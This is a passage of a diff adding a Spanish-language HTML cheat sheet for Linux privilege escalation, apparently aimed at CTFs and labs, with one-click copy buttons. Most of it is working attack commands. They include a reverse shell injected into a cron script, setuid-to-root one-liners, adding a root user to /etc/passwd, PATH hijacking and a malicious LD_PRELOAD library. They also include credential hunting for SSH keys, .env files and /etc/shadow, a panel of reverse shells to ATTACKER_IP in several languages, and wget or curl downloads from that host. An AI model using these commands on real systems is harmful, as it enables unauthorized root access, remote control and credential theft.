+      <div class="acc-title"><div class="acc-dot" style="background:var(--yellow)"></div>CRON JOBS</div>
+      <div class="acc-meta"><span class="acc-count">7</span><span class="acc-risk risk-high">ALTO</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Scripts ejecutados por root de forma periódica que puedes modificar o inyectar.</div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">cat /etc/crontab</code><div class="cmd-note">Crontab global del sistema</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/</code><div class="cmd-note">Todos los directorios de cron</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">crontab -l</code><div class="cmd-note">Crontab del usuario actual</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">cat /var/spool/cron/crontabs/*</code><div class="cmd-note">Crontabs de todos los usuarios</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="red">echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /ruta/script_cron.sh</code><div class="cmd-note">Inyectar reverse shell en script de cron escribible</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code>find / -name "pspy*" 2>/dev/null</code><div class="cmd-note">pspy — monitoriza procesos en tiempo real sin root</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code>watch -n 1 "ps aux | grep root"</code><div class="cmd-note">Detectar procesos root que se ejecutan periódicamente</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <!-- CAPABILITIES -->
+  <div class="acc" data-cat="cap">
+    <div class="acc-hdr" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--green)"></div>CAPABILITIES</div>
+      <div class="acc-meta"><span class="acc-count">6</span><span class="acc-risk risk-high">ALTO</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Linux capabilities permiten privilegios granulares. cap_setuid+ep en Python = root.</div>
+      <div class="cmd-item"><div class="cmd-left"><code class="green">getcap -r / 2>/dev/null</code><div class="cmd-note">Listar todos los binarios con capabilities</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="green">python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code><div class="cmd-note">Python con cap_setuid → root</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="green">perl -e 'use POSIX; setuid(0); exec "/bin/bash";'</code><div class="cmd-note">Perl con cap_setuid → root</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="green">./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'</code><div class="cmd-note">Ruby con cap_setuid</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">cap_net_raw+ep</code><div class="cmd-note">Permite sniffing de red (tcpdump sin sudo)</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">cap_dac_read_search+ep</code><div class="cmd-note">Leer cualquier archivo del sistema sin permisos</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <!-- WRITABLE FILES -->
+  <div class="acc" data-cat="write">
+    <div class="acc-hdr" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--purple)"></div>ARCHIVOS ESCRIBIBLES</div>
+      <div class="acc-meta"><span class="acc-count">8</span><span class="acc-risk risk-high">ALTO</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Archivos de sistema escribibles por usuario no privilegiado → escalada directa.</div>
+      <div class="cmd-item"><div class="cmd-left"><code class="purple">find / -writable -type f 2>/dev/null | grep -Ev "proc|sys|dev"</code><div class="cmd-note">Archivos escribibles fuera de pseudo-fs</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="purple">ls -la /etc/passwd /etc/shadow /etc/sudoers</code><div class="cmd-note">Verificar si archivos críticos son escribibles</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="red">echo 'root2:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' >> /etc/passwd</code><div class="cmd-note">Añadir usuario root si /etc/passwd es escribible</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="purple">find /etc -writable -type f 2>/dev/null</code><div class="cmd-note">Configuraciones de sistema escribibles</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="purple">find /var /tmp /dev/shm -writable -type d 2>/dev/null</code><div class="cmd-note">Directorios escribibles para depositar payloads</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="purple">find / -name "*.conf" -writable 2>/dev/null</code><div class="cmd-note">Archivos de configuración escribibles</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">ls -la /etc/ld.so.conf.d/</code><div class="cmd-note">Rutas de librería dinámicas — LD preload attack</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="yellow">find / -name "*.sh" -writable 2>/dev/null</code><div class="cmd-note">Scripts shell escribibles (posibles cron targets)</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <!-- PATH HIJACKING -->
+  <div class="acc" data-cat="write">
+    <div class="acc-hdr" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--purple)"></div>PATH HIJACKING</div>
+      <div class="acc-meta"><span class="acc-count">5</span><span class="acc-risk risk-high">ALTO</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Si un script SUID llama a un binario sin ruta absoluta, puedes sustituirlo con un directorio escribible en el PATH.</div>
+      <div class="cmd-item"><div class="cmd-left"><code class="purple">echo $PATH</code><div class="cmd-note">Ver el PATH actual</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="purple">export PATH=/tmp:$PATH</code><div class="cmd-note">Añadir /tmp al inicio del PATH</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="red">echo '/bin/bash -p' > /tmp/NOMBRE_BINARIO && chmod +x /tmp/NOMBRE_BINARIO</code><div class="cmd-note">Crear binario falso en /tmp que lanza bash root</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="purple">strings /usr/local/bin/script_suid | grep -v "^/"</code><div class="cmd-note">Detectar llamadas sin ruta absoluta en un binario SUID</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="purple">ltrace ./script_suid 2>&1 | head -40</code><div class="cmd-note">Trazar llamadas a librería para ver qué ejecuta</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <!-- KERNEL EXPLOITS -->
+  <div class="acc" data-cat="kernel">
+    <div class="acc-hdr" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--red)"></div>KERNEL EXPLOITS</div>
+      <div class="acc-meta"><span class="acc-count">7</span><span class="acc-risk risk-crit">CRÍTICO</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Vulnerabilidades de kernel que elevan directamente a root. Cuidado: pueden crashear el sistema.</div>
+      <div class="cmd-item"><div class="cmd-left"><code class="red">uname -r</code><div class="cmd-note">Versión exacta del kernel — buscar en Exploit-DB</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="red">cat /proc/version</code><div class="cmd-note">Versión y compilador del kernel</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="orange">DirtyPipe — CVE-2022-0847</code><div class="cmd-note">Kernel 5.8-5.16: write a archivos de solo lectura → root</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="orange">DirtyC0w — CVE-2016-5195</code><div class="cmd-note">Race condition clásico, kernels < 4.8.3</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="orange">Overlayfs — CVE-2021-3493</code><div class="cmd-note">Ubuntu 20.04 LTS → root inmediato</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="orange">PwnKit — CVE-2021-4034</code><div class="cmd-note">pkexec SUID en casi todas las distros → root</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="red">searchsploit "linux kernel $(uname -r | cut -d. -f1,2)"</code><div class="cmd-note">Buscar exploits locales con searchsploit</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <!-- CREDENCIALES -->
+  <div class="acc" data-cat="enum">
+    <div class="acc-hdr" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--cyan)"></div>CAZA DE CREDENCIALES</div>
+      <div class="acc-meta"><span class="acc-count">8</span><span class="acc-risk risk-high">ALTO</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Contraseñas en archivos de configuración, historiales, backups y variables de entorno.</div>
+      <div class="cmd-item"><div class="cmd-left"><code class="cyan">grep -rn "password\|passwd\|secret\|api_key" /var/www/ 2>/dev/null</code><div class="cmd-note">Buscar credenciales en webs</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="cyan">find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | xargs grep -l "pass" 2>/dev/null</code><div class="cmd-note">Configs con posibles contraseñas</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="cyan">cat ~/.ssh/id_rsa 2>/dev/null</code><div class="cmd-note">Clave SSH privada del usuario</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="cyan">find / -name "id_rsa" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null</code><div class="cmd-note">Claves SSH en todo el sistema</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="cyan">cat /etc/shadow 2>/dev/null</code><div class="cmd-note">Hashes de contraseñas (requiere root o permisos)</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="cyan">find / -name ".env" 2>/dev/null | xargs cat 2>/dev/null</code><div class="cmd-note">Archivos .env con tokens y secrets</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="cyan">find / -name "wp-config.php" -o -name "config.php" 2>/dev/null</code><div class="cmd-note">Configs de WordPress y otros CMS</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="cyan">mysql -u root --password 2>/dev/null</code><div class="cmd-note">MySQL sin contraseña — muy común en labs</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <!-- LD_PRELOAD -->
+  <div class="acc" data-cat="sudo">
+    <div class="acc-hdr" onclick="togAcc(this.parentElement)">
+      <div class="acc-title"><div class="acc-dot" style="background:var(--orange)"></div>LD_PRELOAD / LD_LIBRARY</div>
+      <div class="acc-meta"><span class="acc-count">4</span><span class="acc-risk risk-crit">CRÍTICO</span><span class="acc-chev">▾</span></div>
+    </div>
+    <div class="acc-body">
+      <div class="acc-desc">Si sudo preserva LD_PRELOAD (env_keep), puedes cargar una librería maliciosa al ejecutar cualquier binario con sudo.</div>
+      <div class="cmd-item"><div class="cmd-left"><code class="orange">sudo -l | grep LD_PRELOAD</code><div class="cmd-note">Verificar si LD_PRELOAD está en env_keep</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="red">/* shell.c */
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+void _init() {
+  unsetenv("LD_PRELOAD");
+  setuid(0); setgid(0);
+  system("/bin/bash");
+}</code><div class="cmd-note">Librería maliciosa — compilar con gcc -shared -o /tmp/shell.so shell.c</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="orange">gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c</code><div class="cmd-note">Compilar la librería</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+      <div class="cmd-item"><div class="cmd-left"><code class="orange">sudo LD_PRELOAD=/tmp/shell.so /usr/bin/cualquier-binario</code><div class="cmd-note">Ejecutar con LD_PRELOAD → bash root</div></div><button class="copy-btn" onclick="cp(event,this)">⎘</button></div>
+    </div>
+  </div>
+
+  <div class="no-res" id="no-res">// sin resultados</div>
+</div>
+
+<!-- PANEL: SHELLS -->
+<div class="panel" id="panel-shells">
+
+  <div class="sec-hdr">REVERSE SHELLS</div>
+  <div class="warn">⚠ Cambia ATTACKER_IP y PORT por tus valores antes de usar.</div>
+
+  <div class="combo">
+    <div class="combo-lbl">// BASH TCP</div>
+    <div class="combo-code"><span>bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</span><button class="copy-btn" onclick="cpCombo(event,this)">⎘</button></div>
+    <div class="combo-desc">La más clásica. Funciona en casi cualquier bash moderno.</div>
+  </div>
+
+  <div class="combo">
+    <div class="combo-lbl">// BASH UDP</div>
+    <div class="combo-code"><span>bash -i >& /dev/udp/ATTACKER_IP/4444 0>&1</span><button class="copy-btn" onclick="cpCombo(event,this)">⎘</button></div>
+    <div class="combo-desc">Útil si TCP está bloqueado por firewall.</div>
+  </div>
+
+  <div class="combo">
+    <div class="combo-lbl">// PYTHON 3</div>
+    <div class="combo-code"><span>python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'</span><button class="copy-btn" onclick="cpCombo(event,this)">⎘</button></div>
+    <div class="combo-desc">Cuando bash no da reverse shell pero Python está disponible.</div>
+  </div>
+
+  <div class="combo">
+    <div class="combo-lbl">// NETCAT (con -e)</div>
+    <div class="combo-code"><span>nc -e /bin/bash ATTACKER_IP 4444</span><button class="copy-btn" onclick="cpCombo(event,this)">⎘</button></div>
+    <div class="combo-desc">Solo funciona con la versión tradicional de nc (no OpenBSD).</div>
+  </div>
+
+  <div class="combo">
+    <div class="combo-lbl">// NETCAT (sin -e)</div>
+    <div class="combo-code"><span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f</span><button class="copy-btn" onclick="cpCombo(event,this)">⎘</button></div>
+    <div class="combo-desc">Para OpenBSD nc (la más común en sistemas modernos).</div>
+  </div>
+
+  <div class="combo">
+    <div class="combo-lbl">// PERL</div>
+    <div class="combo-code"><span>perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'</span><button class="copy-btn" onclick="cpCombo(event,this)">⎘</button></div>
+    <div class="combo-desc">Útil en servidores con Perl pero sin Python.</div>
+  </div>
+
+  <div class="combo">
+    <div class="combo-lbl">// PHP</div>
+    <div class="combo-code"><span>php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'</span><button class="copy-btn" onclick="cpCombo(event,this)">⎘</button></div>
+    <div class="combo-desc">Para servidores web con PHP accesible desde CLI.</div>
+  </div>
+
+  <div class="sec-hdr orange" style="margin-top:14px">UPGRADE TTY</div>
+  <div class="tip">Después de obtener reverse shell, siempre haz upgrade para tener una TTY completa (Ctrl+C, tab completion, etc.)</div>
+
+  <div class="combo">
+    <div class="combo-lbl">// PASO 1 — PYTHON PTY</div>
+    <div class="combo-code"><span>python3 -c 'import pty; pty.spawn("/bin/bash")'</span><button class="copy-btn" onclick="cpCombo(event,this)">⎘</button></div>
+    <div class="combo-desc">Spawnea una TTY con Python.</div>
+  </div>
+
+  <div class="combo">
+    <div class="combo-lbl">// PASO 2 — BACKGROUND + STTY</div>
+    <div class="combo-code"><span>Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm</span><button class="copy-btn" onclick="cpCombo(event,this)">⎘</button></div>
+    <div class="combo-desc">TTY completamente funcional en tu terminal local.</div>
+  </div>
+
+  <div class="combo">
+    <div class="combo-lbl">// LISTENER ATTACKER</div>
+    <div class="combo-code"><span>nc -lvnp 4444</span><button class="copy-btn" onclick="cpCombo(event,this)">⎘</button></div>
+    <div class="combo-desc">Escucha en tu máquina antes de lanzar la reverse shell.</div>
+  </div>
+
+  <div class="combo">
+    <div class="combo-lbl">// RLWRAP (mejor UX)</div>
+    <div class="combo-code"><span>rlwrap nc -lvnp 4444</span><button class="copy-btn" onclick="cpCombo(event,this)">⎘</button></div>
+    <div class="combo-desc">Añade historial y flechas a nc sin upgrade completo.</div>
+  </div>
+</div>
+
+<!-- PANEL: CHECKLIST -->
+<div class="panel" id="panel-check">
+
+  <div class="sec-hdr">METODOLOGÍA PrivEsc</div>
+
+  <div class="phase">
+    <div class="phase-step" style="background:rgba(255,45,85,0.08)">
+      <div class="phase-num" style="color:var(--red)">01</div>
+      <div class="phase-txt">Enum</div>
+    </div>
+    <div class="phase-step" style="background:rgba(255,107,53,0.07)">
+      <div class="phase-num" style="color:var(--orange)">02</div>
+      <div class="phase-txt">Vector</div>
+    </div>
+    <div class="phase-step" style="background:rgba(255,214,10,0.06)">
+      <div class="phase-num" style="color:var(--yellow)">03</div>
+      <div class="phase-txt">Exploit</div>
+    </div>
+    <div class="phase-step" style="background:rgba(57,255,20,0.05)">
+      <div class="phase-num" style="color:var(--green)">04</div>
+      <div class="phase-txt">Root</div>
+    </div>
+  </div>
+
+  <div class="prog-wrap">
+    <div class="prog-lbl">Progreso checklist <span id="cpct">0%</span></div>
+    <div class="prog-bar"><div class="prog-fill" id="cbar"></div></div>
+  </div>
+
+  <div id="chklist">
+    <div class="chk-item" onclick="togChk(this)"><div class="chk-box">✓</div><div class="chk-text">Obtener shell estable con TTY completa</div><span class="chk-badge cr">INIT</span></div>
+    <div class="chk-item" onclick="togChk(this)"><div class="chk-box">✓</div><div class="chk-text">Ejecutar <code>id && uname -a && cat /etc/os-release</code></div><span class="chk-badge cr">ENUM</span></div>
+    <div class="chk-item" onclick="togChk(this)"><div class="chk-box">✓</div><div class="chk-text">Lanzar LinPEAS o LSE y revisar salida</div><span class="chk-badge co">AUTO</span></div>
+    <div class="chk-item" onclick="togChk(this)"><div class="chk-box">✓</div><div class="chk-text">Revisar <code>sudo -l</code> — buscar NOPASSWD o ALL</div><span class="chk-badge cr">SUDO</span></div>
+    <div class="chk-item" onclick="togChk(this)"><div class="chk-box">✓</div><div class="chk-text">Buscar binarios SUID/SGID y cruzar con GTFOBins</div><span class="chk-badge cr">SUID</span></div>
+    <div class="chk-item" onclick="togChk(this)"><div class="chk-box">✓</div><div class="chk-text">Revisar crontabs: global, usuario y directorios cron.*</div><span class="chk-badge co">CRON</span></div>
+    <div class="chk-item" onclick="togChk(this)"><div class="chk-box">✓</div><div class="chk-text">Ejecutar <code>getcap -r / 2>/dev/null</code></div><span class="chk-badge cg">CAPS</span></div>
+    <div class="chk-item" onclick="togChk(this)"><div class="chk-box">✓</div><div class="chk-text">Buscar archivos escribibles en /etc, /var, /opt</div><span class="chk-badge cp">WRITE</span></div>
+    <div class="chk-item" onclick="togChk(this)"><div class="chk-box">✓</div><div class="chk-text">Cazar credenciales: historial, configs, .env, SSH keys</div><span class="chk-badge cc">CREDS</span></div>
+    <div class="chk-item" onclick="togChk(this)"><div class="chk-box">✓</div><div class="chk-text">Verificar PATH hijacking en scripts SUID</div><span class="chk-badge co">PATH</span></div>
+    <div class="chk-item" onclick="togChk(this)"><div class="chk-box">✓</div><div class="chk-text">Ejecutar linux-exploit-suggester para kernel CVEs</div><span class="chk-badge cr">KERN</span></div>
+    <div class="chk-item" onclick="togChk(this)"><div class="chk-box">✓</div><div class="chk-text">Revisar servicios internos con <code>ss -tulpn</code> (puertos locales)</div><span class="chk-badge cc">NET</span></div>
+    <div class="chk-item" onclick="togChk(this)"><div class="chk-box">✓</div><div class="chk-text">Confirmar acceso root: <code>id && cat /root/root.txt</code></div><span class="chk-badge cg">ROOT</span></div>
+  </div>
+</div>
+
+<!-- PANEL: INFO -->
+<div class="panel" id="panel-info">
+
+  <div class="sec-hdr">VECTORES POR SEVERIDAD</div>
+
+  <div class="card">
+    <h3 class="r">// CRÍTICO — ROOT INMEDIATO</h3>
+    <div class="chips">
+      <span class="chip cr">SUID en bash/vim/find</span>
+      <span class="chip cr">sudo ALL NOPASSWD</span>
+      <span class="chip cr">DirtyPipe / PwnKit</span>
+      <span class="chip cr">/etc/passwd escribible</span>
+      <span class="chip cr">LD_PRELOAD + sudo</span>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3 class="o">// ALTO — REQUIERE CONDICIÓN</h3>
+    <div class="chips">
+      <span class="chip co">Cron script escribible</span>
+      <span class="chip co">cap_setuid en Python</span>
+      <span class="chip co">PATH hijacking</span>
+      <span class="chip co">Credenciales reutilizadas</span>
+      <span class="chip co">Script root con input</span>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3 class="c">// RECURSOS ESENCIALES</h3>
+    <p>GTFOBins — binarios con técnicas de escape y escalada</p>
+    <p>PayloadsAllTheThings — colección masiva de privesc</p>
+    <p>HackTricks — guías por vector con ejemplos reales</p>
+    <p>Exploit-DB / SearchSploit — CVEs de kernel locales</p>
+  </div>
+
+  <div class="sec-hdr green">SEÑALES DE VULNERABILIDAD</div>
+
+  <div class="tip">✅ <code style="color:var(--green);font-size:11px">sudo -l</code> muestra NOPASSWD → explotar primero, es trivial.</div>
+  <div class="tip">✅ LinPEAS marca en <span style="color:var(--red)">rojo/amarillo</span> los hallazgos críticos. Empezar por ahí.</div>
+  <div class="warn">⚡ Los exploits de kernel pueden crashear la máquina. Úsalos como último recurso en entornos productivos.</div>
+  <div class="info">🔵 En CTFs/labs: LinPEAS + sudo -l + SUID resuelven el 80% de los casos.</div>
+
+  <div class="sec-hdr purple">SHELLS ÚTILES RÁPIDAS</div>
+
+  <div class="card">
+    <h3 class="p">// ESTABILIZAR SHELL</h3>
+    <p>1. <code style="color:var(--green);font-size:11px">python3 -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+    <p>2. Ctrl+Z → <code style="color:var(--green);font-size:11px">stty raw -echo; fg</code></p>
+    <p>3. <code style="color:var(--green);font-size:11px">export TERM=xterm; stty rows 50 cols 200</code></p>
+  </div>
+
+  <div class="card">
+    <h3 class="r">// TRANSFERIR ARCHIVOS</h3>
+    <p><code style="color:var(--cyan);font-size:11px">python3 -m http.server 8080</code> — servidor HTTP en attacker</p>
+    <p><code style="color:var(--cyan);font-size:11px">wget http://ATTACKER_IP:8080/linpeas.sh</code> — descargar en víctima</p>
+    <p><code style="color:var(--cyan);font-size:11px">curl http://ATTACKER_IP:8080/file -o /tmp/file</code> — alternativa</p>
+  </div>
+
+</div>
+
+<!-- BOTTOM NAV -->
+<nav class="bnav">
+  <button class="bnav-btn active" onclick="swPanel('panel-vec',this)">
+    <span class="icon">⚔</span>VECTORES
+  </button>
+  <button class="bnav-btn" onclick="swPanel('panel-shells',this)">
+    <span class="icon">🐚</span>SHELLS
+  </button>
+  <button class="bnav-btn" onclick="swPanel('panel-check',this)">
+    <span class="icon">◉</span>CHECK
+  </button>
+  <button class="bnav-btn" onclick="swPanel('panel-info',this)">
+    <span class="icon">◈</span>INFO
+  </button>
+</nav>
+
+</div>
+
+<script>
+function swPanel(id, btn) {
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.bnav-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  btn.classList.add('active');
+  window.scrollTo({top:0, behavior:'smooth'});
+}
+
+function togAcc(item) {
+  const isOpen = item.classList.contains('open');
+  document.querySelectorAll('.acc.open').forEach(i => { if(i!==item) i.classList.remove('open'); });
+  item.classList.toggle('open', !isOpen);
+}
+
+function togChk(el) {
+  el.classList.toggle('done');
+  const items = document.querySelectorAll('.chk-item');
+  const done  = document.querySelectorAll('.chk-item.done');
+  const pct   = Math.round(done.length / items.length * 100);
+  document.getElementById('cpct').textContent = pct + '%';
+  document.getElementById('cbar').style.width  = pct + '%';
+}
+
+function cp(event, btn) {
+  event.stopPropagation();
+  const code = btn.previousElementSibling.querySelector('code').textContent.trim();
+  navigator.clipboard.writeText(code).then(() => {
+    btn.textContent='✓'; btn.classList.add('ok');
+    setTimeout(()=>{ btn.textContent='⎘'; btn.classList.remove('ok'); }, 1500);
+  });
+}
+
+function cpCombo(event, btn) {
+  event.stopPropagation();
+  const code = btn.previousElementSibling.textContent.trim();
+  navigator.clipboard.writeText(code).then(() => {
+    btn.textContent='✓'; btn.classList.add('ok');
+    setTimeout(()=>{ btn.textContent='⎘'; btn.classList.remove('ok'); }, 1500);
+  });
+}
+
+let activeCat = 'all';
+
+function fcat(cat, btn) {
+  activeCat = cat;
+  document.querySelectorAll('.ftab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.querySelectorAll('.acc').forEach(g => {
+    g.toggleAttribute('data-hidden', cat !== 'all' && g.dataset.cat !== cat);
+  });
+  document.getElementById('search-in').value = '';
+  updateRc();
+}
+
+function doSearch(q) {
+  const ql = q.toLowerCase().trim();
+  document.querySelectorAll('.acc').forEach(g => {
+    if (activeCat !== 'all' && g.dataset.cat !== activeCat) { g.setAttribute('data-hidden','true'); return; }
+    if (!ql) { g.removeAttribute('data-hidden'); return; }
+    const text = g.textContent.toLowerCase();
+    if (text.includes(ql)) { g.removeAttribute('data-hidden'); if(!g.classList.contains('open')) g.classList.add('open'); }
+    else g.setAttribute('data-hidden','true');
+  });
+  const vis = document.querySelectorAll('.acc:not([data-hidden])');
+  document.getElementById('no-res').classList.toggle('vis', vis.length === 0);
+  updateRc();
+}
+
+function updateRc() {
+  const vis = document.querySelectorAll('.acc:not([data-hidden]) .cmd-item');
+  document.getElementById('rcn').textContent = vis.length || '120+';
+}
+</script>
+</body>
+</html>
